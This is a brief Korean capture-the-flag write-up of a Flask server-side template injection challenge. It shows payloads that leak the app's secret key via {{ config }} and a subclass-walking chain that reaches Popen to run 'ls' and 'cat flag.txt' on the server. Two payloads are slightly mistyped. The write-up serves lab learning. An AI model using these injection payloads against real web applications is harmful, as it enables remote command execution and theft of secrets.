app.py에서 request.path를 템플릿에 그대로 넣어 SSTI 취약점이 발생하고 있다.
app.secret_key에 FLAG 값이 들어있다. FLAG는 전역변수가 아니기 때문에 {{ FLAG }} 를 통해 접근할 수 없다.
FLASK에서는 config에 여러 변수들을 관리하고 있기 때문에 {{ config }} 를 확인한다.
{{ config.SECRET_KEY }} 값에 FLAG 값이 들어있는 것을 확인할 수 있다.

파일을 직접 읽는 방법
os모듈에 접근하여 ls, cat 명령어를 통해 flag.txt 파일을 직접 읽을 수 있다.

config.from_object('os')를 통해 os라이브러리에 있던 config들을 추가시킨다.
''.__class__를 통해 str에 접근하고
''.__class__.__mro__를 통해 root 클래스에 접근할 수 있다.
''.__class__.__mro__[1]로 object 타입을 선택한다.
''.__class__.__mro__[1].__subclasses__()를 통해 모든 서브클래스들을 확인한다.
필요한 클래스의 인덱스를 찾아 사용할 수 있다. Popen클래스를 찾아 직접 파일을 연다.
''.__class__.__mro__[1].__subclasses__()[408]('ls', shell=True, stdout=-1).communitate()를 통해 ls 명령어를 실행시킨다.
flag.txt 파일이 있는 것을 확인한다.
'.__class__.__mro__[1].__subclasses__()[408]('cat flag.txt', shell=True, stdout=-1).communitate()을 통해 flag.txt 파일을 연다.